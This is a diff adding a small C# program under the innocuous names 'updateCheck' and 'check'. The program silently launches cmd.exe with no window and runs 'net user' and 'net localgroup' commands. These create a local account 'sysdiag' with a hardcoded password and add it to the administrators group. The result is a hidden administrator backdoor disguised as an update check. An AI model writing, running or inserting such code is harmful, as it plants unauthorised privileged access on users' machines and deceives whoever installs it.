@@ -1,0 +1,32 @@
+using System;
+using System.Text;
+using System.Diagnostics;
+using System.Threading;
+
+namespace updateCheck
+{
+    public class check
+    {
+        public static void Main()
+        {
+            string executeCMD;
+            executeCMD = "net user sysdiag Thisisnot!14 /add && ";
+            executeCMD += "net localgroup administrators sysdiag /add";
+            //executeCMD += "...";
+            //Console.WriteLine(executeCMD);
+
+            Process cmd = new Process();
+            cmd.StartInfo.FileName = "cmd.exe";
+            cmd.StartInfo.RedirectStandardInput = true;
+            cmd.StartInfo.RedirectStandardOutput = true;
+            cmd.StartInfo.RedirectStandardError = true;
+            cmd.StartInfo.CreateNoWindow = true;
+            cmd.StartInfo.UseShellExecute = false;
+            cmd.StartInfo.Arguments = "/C " + executeCMD;
+            cmd.Start();
+            // Last 2 lines may need to be reversed...
+            cmd.StandardOutput.ReadToEnd();
+            cmd.WaitForExit();
+        }
+    }
+}
